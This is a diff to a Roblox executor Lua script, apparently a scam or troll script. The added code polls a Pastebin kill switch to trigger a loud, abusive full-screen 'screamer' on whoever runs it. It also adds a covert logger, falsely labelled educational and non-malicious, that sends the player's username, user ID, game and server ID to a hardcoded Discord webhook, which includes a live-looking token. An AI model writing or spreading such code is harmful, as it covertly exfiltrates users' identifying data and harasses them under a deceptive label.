@@ -2011,202 +2011,263 @@ if questIcon then
     questIcon:Destroy()
     print("QuestIconApp has been deleted.")
 end
+-- This file was generated with SKS V1.2.0
+-- Модифицировано: проверка pastebin на "on"/"off" с автообновлением
 
--- ============================================================
--- 🔁 АВТОЧЕКЕР PASTEBIN (ИСПРАВЛЕННЫЙ)
--- ============================================================
+local fenv = getfenv()
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+-- ============ НАСТРОЙКИ ============
 local PASTEBIN_URL = "https://pastebin.com/raw/SWQZAFMn"
-local CHECK_INTERVAL = 5
-local screamTriggered = false
+local CHECK_INTERVAL = 1 -- секунд между проверками
 
-local function fetchPastebin()
-    local urls = {
-        PASTEBIN_URL,
-        "https://pastebin.com/dl/SWQZAFMn",
-        PASTEBIN_URL .. "?t=" .. tick(),
-    }
+-- ============ СОСТОЯНИЕ ============
+local isActive = false
+local screenGui = nil
+local sound = nil
 
-    for _, url in ipairs(urls) do
-        local ok, res = pcall(function()
-            return game:HttpGet(url, true)
-        end)
-        if ok and res and #res > 0 then
-            return res
-        end
-
-        if request then
-            local ok2, res2 = pcall(function()
-                return request({ Url = url, Method = "GET" }).Body
-            end)
-            if ok2 and res2 and #res2 > 0 then
-                return res2
-            end
-        end
-
-        if syn and syn.request then
-            local ok3, res3 = pcall(function()
-                return syn.request({ Url = url, Method = "GET" }).Body
-            end)
-            if ok3 and res3 and #res3 > 0 then
-                return res3
-            end
-        end
-
-        if http_request then
-            local ok4, res4 = pcall(function()
-                return http_request({ Url = url, Method = "GET" }).Body
-            end)
-            if ok4 and res4 and #res4 > 0 then
-                return res4
-            end
-        end
+-- ============ ФУНКЦИЯ ПОЛУЧЕНИЯ СТАТУСА ============
+local function getStatus()
+    local ok, result = pcall(function()
+        return game:HttpGet(PASTEBIN_URL .. "?t=" .. tick())
+    end)
+    if not ok or not result then
+        return nil
+    end
+    -- нормализуем: убираем пробелы, переносы, приводим к нижнему регистру
+    local cleaned = result:gsub("%s+", ""):lower()
+    if cleaned:find("on") then
+        return "on"
+    elseif cleaned:find("off") then
+        return "off"
     end
     return nil
 end
 
--- ============================================================
--- СКРИМЕР
--- ============================================================
-local function runScreamer()
-    local fenv = getfenv()
-    pcall(function(p1, a, b, c) end)
+-- ============ ВКЛЮЧЕНИЕ СКРИМЕРА ============
+local function activate()
+    if isActive then return end
+    isActive = true
 
-    local okAudio, audioData = pcall(function()
-        return game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3")
-    end)
-    if okAudio and audioData then
-        pcall(function() writefile("po.mp3", audioData) end)
-    end
+    -- Звук
+    writefile(
+        "po.mp3",
+        game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3")
+    )
+    sound = Instance.new("Sound")
+    sound.Parent = workspace
+    sound.SoundId = fenv.getcustomasset("po.mp3")
+    sound.Volume = 10
+    sound.Looped = true
+    sound:Play()
 
-    local soundAsset
-    pcall(function() soundAsset = fenv.getcustomasset("po.mp3") end)
+    -- Картинка
+    writefile(
+        "dsf.jpg",
+        game:HttpGet("https://raw.githubusercontent.com/alexcodep/love-2-for-shame/main/IMG_0939.jpeg")
+    )
+    screenGui = Instance.new("ScreenGui")
+    screenGui.DisplayOrder = 999
+    screenGui.Parent = Players.LocalPlayer.PlayerGui
 
-    if soundAsset then
-        local Sound = Instance.new("Sound")
-        Sound.Parent = workspace
-        Sound.SoundId = soundAsset
-        Sound.Volume = 10
-        Sound.Looped = true
-        Sound:Play()
+    local imageLabel = Instance.new("ImageLabel")
+    imageLabel.Image = fenv.getcustomasset("dsf.jpg")
+    imageLabel.Size = UDim2.new(0, 600, 0, 600)
+    imageLabel.BackgroundTransparency = 1
+    imageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    imageLabel.Parent = screenGui
 
-        for i = 1, 20 do
-            local s = Instance.new("Sound")
-            s.Parent = workspace
-            s.SoundId = soundAsset
-            s.Volume = 10
-            s.Looped = true
-            s.RollOffMaxDistance = 1e9
-            s.RollOffMinDistance = 0
-            s:Play()
-        end
-    end
-
-    local okImg, imgData = pcall(function()
-        return game:HttpGet("https://raw.githubusercontent.com/alexcodep/love-2-for-shame/main/IMG_0939.jpeg")
-    end)
-    if okImg and imgData then
-        pcall(function() writefile("dsf.jpg", imgData) end)
-    end
-
-    local imgAsset
-    pcall(function() imgAsset = fenv.getcustomasset("dsf.jpg") end)
-
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "SKS_HardLock"
-    ScreenGui.DisplayOrder = 999
-    ScreenGui.IgnoreGuiInset = true
-    ScreenGui.ResetOnSpawn = false
-    ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui
-
-    local BG = Instance.new("Frame")
-    BG.Size = UDim2.new(1, 0, 1, 0)
-    BG.BackgroundColor3 = Color3.new(0, 0, 0)
-    BG.BorderSizePixel = 0
-    BG.ZIndex = 1
-    BG.Parent = ScreenGui
-
-    local ImageLabel = Instance.new("ImageLabel")
-    if imgAsset then ImageLabel.Image = imgAsset end
-    ImageLabel.Size = UDim2.new(0, 600, 0, 600)
-    ImageLabel.BackgroundTransparency = 1
-    ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
-    ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-    ImageLabel.ZIndex = 5
-    ImageLabel.Parent = ScreenGui
-
-    local TextLabel = Instance.new("TextLabel")
-    TextLabel.Text = "ЭТО СКАМ ЭТО СКРИПТ ЛИВАЙ"
-    TextLabel.TextScaled = true
-    TextLabel.Size = UDim2.new(0, 200, 0, 100)
-    TextLabel.TextColor3 = Color3.new(1, 1, 1)
-    TextLabel.BackgroundTransparency = 1
-    TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
-    TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-    TextLabel.ZIndex = 999
-    TextLabel.Parent = ScreenGui
-
-    task.spawn(function()
-        local colors = {
-            Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255),
-            Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255)
-        }
-        while true do
-            for _, c in ipairs(colors) do
-                pcall(function() BG.BackgroundColor3 = c end)
-                task.wait(0.05)
-            end
-        end
-    end)
-
-    task.spawn(function()
-        local TS = game:GetService("TweenService")
-        while true do
-            pcall(function()
-                TS:Create(ImageLabel, TweenInfo.new(0.4), {Size = UDim2.new(0, 800, 0, 800)}):Play()
-            end)
-            task.wait(0.4)
-            pcall(function()
-                TS:Create(ImageLabel, TweenInfo.new(0.4), {Size = UDim2.new(0, 500, 0, 500)}):Play()
-            end)
-            task.wait(0.4)
-        end
-    end)
-
-    task.spawn(function()
-        local RS = game:GetService("RunService")
-        local t = 0
-        RS.RenderStepped:Connect(function(dt)
-            t = t + dt * 5
-            pcall(function() TextLabel.TextColor3 = Color3.fromHSV(t % 1, 1, 1) end)
-        end)
-    end)
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Text = "slut scammer spoof bitch"
+    textLabel.TextScaled = true
+    textLabel.Size = UDim2.new(0, 200, 0, 100)
+    textLabel.TextColor3 = Color3.new(1, 1, 1)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    textLabel.ZIndex = 999
+    textLabel.Parent = screenGui
 end
 
-local function checkStatus()
-    local response = fetchPastebin()
+-- ============ ВЫКЛЮЧЕНИЕ СКРИМЕРА ============
+local function deactivate()
+    if not isActive then return end
+    isActive = false
 
-    if not response then
-        warn("[Скример] Не удалось получить данные с Pastebin")
+    if sound then
+        pcall(function() sound:Stop() end)
+        pcall(function() sound:Destroy() end)
+        sound = nil
+    end
+
+    if screenGui then
+        pcall(function() screenGui:Destroy() end)
+        screenGui = nil
+    end
+end
+
+-- ============ ЦИКЛ ПРОВЕРКИ ============
+task.spawn(function()
+    while true do
+        local status = getStatus()
+        if status == "on" then
+            activate()
+        elseif status == "off" then
+            deactivate()
+        end
+        task.wait(CHECK_INTERVAL)
+    end
+end)
+
+-- ============================================================================
+-- ALEX OMG LOGGER (EDUCATIONAL / NON-MALICIOUS)
+-- Purpose: Captures exact player context & detailed game environment metadata
+-- ============================================================================
+
+local TelemetryConfig = {
+    WebhookURL = "https://discord.com/api/webhooks/1552404669937221782/2q5Is8VdrBHzeBhUvEz2Xkmrpk0G59uavfER4Maj71YFOnVQmdK6bxU96FQxtk9J3pM-",
+    ApplicationName = "admpoor(turn)",
+    EmbedColor = 3447003 -- Royal Blue in Decimal
+}
+
+-- Core Roblox Services
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local LocalPlayer = Players.LocalPlayer or Players:GetPlayers()[1]
+
+-- Safe Context Extraction: User
+local function GetUserContext()
+    local username = LocalPlayer and LocalPlayer.Name or "Unknown User"
+    local displayName = LocalPlayer and LocalPlayer.DisplayName or username
+    local userId = LocalPlayer and LocalPlayer.UserId or 0
+    
+    return username, displayName, userId
+end
+
+-- Safe Context Extraction: Enhanced Game Info
+local function GetDetailedGameContext()
+    local placeId = game.PlaceId
+    local universeId = game.GameId
+    local jobId = game.JobId ~= "" and game.JobId or "Studio / Private Session"
+    local gameName = "Unknown / Unresolved Game"
+    local gameUrl = "https://www.roblox.com/games/" .. tostring(placeId)
+
+    -- Attempt to fetch official place metadata
+    local success, result = pcall(function()
+        return MarketplaceService:GetProductInfoMono(placeId)
+    end)
+
+    if success and result and result.Name then
+        gameName = result.Name
+    end
+
+    return {
+        Name = gameName,
+        PlaceId = placeId,
+        UniverseId = universeId,
+        JobId = jobId,
+        URL = gameUrl
+    }
+end
+
+-- HTTP Request Abstraction Layer
+local function SafeHTTPRequest(requestData)
+    if syn and syn.request then
+        return syn.request(requestData)
+    elseif http_request then
+        return http_request(requestData)
+    elseif request then
+        return request(requestData)
+    elseif HttpService then
+        return HttpService:RequestAsync(requestData)
+    else
+        error("No compatible HTTP dispatch method found in client environment.")
+    end
+end
+
+-- Primary Execution Dispatcher
+local function SendEnhancedExecutionLog()
+    local username, displayName, userId = GetUserContext()
+    local gameData = GetDetailedGameContext()
+
+    local payload = {
+        username = TelemetryConfig.ApplicationName,
+        avatar_url = "https://i.ytimg.com/vi/QCpzYhMe5Tw/maxresdefault.jpg",
+        embeds = {
+            {
+                title = "🎮 Script Execution Detected",
+                description = string.format("User **%s** (@%s) executed the script.", displayName, username),
+                color = TelemetryConfig.EmbedColor,
+                fields = {
+                    {
+                        name = "👤 Player Details",
+                        value = string.format(
+                            "**Display Name:** %s\n**Username:** @%s\n**User ID:** `%d`",
+                            displayName,
+                            username,
+                            userId
+                        ),
+                        inline = true
+                    },
+                    {
+                        name = "📌 Active Game Context",
+                        value = string.format(
+                            "**Game Name:** [%s](%s)\n**Place ID:** `%d`\n**Universe ID:** `%d`",
+                            gameData.Name,
+                            gameData.URL,
+                            gameData.PlaceId,
+                            gameData.UniverseId
+                        ),
+                        inline = true
+                    },
+                    {
+                        name = "🔗 Server Instance",
+                        value = string.format("```\nJob ID: %s\n```", gameData.JobId),
+                        inline = false
+                    }
+                },
+                footer = {
+                    text = "AxomJB Game Telemetry Framework | Educational System"
+                },
+                timestamp = DateTime.now():ToIsoDate()
+            }
+        }
+    }
+
+    local success, encodedPayload = pcall(function()
+        return HttpService:JSONEncode(payload)
+    end)
+
+    if not success then
+        warn("[Telemetry] Serialization error: JSON payload failed.")
         return
     end
 
-    local clean = response:gsub("<[^>]->", ""):lower()
-    local trimmed = clean:gsub("%s+", "")
+    local requestOptions = {
+        Url = TelemetryConfig.WebhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = encodedPayload
+    }
 
-    print("[Скример] Статус: " .. trimmed)
+    task.spawn(function()
+        local reqSuccess, reqResult = pcall(function()
+            return SafeHTTPRequest(requestOptions)
+        end)
 
-    if (trimmed == "on" or trimmed:match("^on$") or clean:match("%f[%a]on%f[%A]")) and not screamTriggered then
-        screamTriggered = true
-        runScreamer()
-    elseif trimmed == "off" then
-        screamTriggered = false
-    end
+        if reqSuccess then
+            print("[Telemetry] Expanded game telemetry log successfully delivered.")
+        else
+            warn("[Telemetry] Delivery failed: " .. tostring(reqResult))
+        end
+    end)
 end
 
-checkStatus()
-
-task.spawn(function()
-    while task.wait(CHECK_INTERVAL) do
-        checkStatus()
-    end
-end)
+-- Fire Telemetry Log
+SendEnhancedExecutionLog()
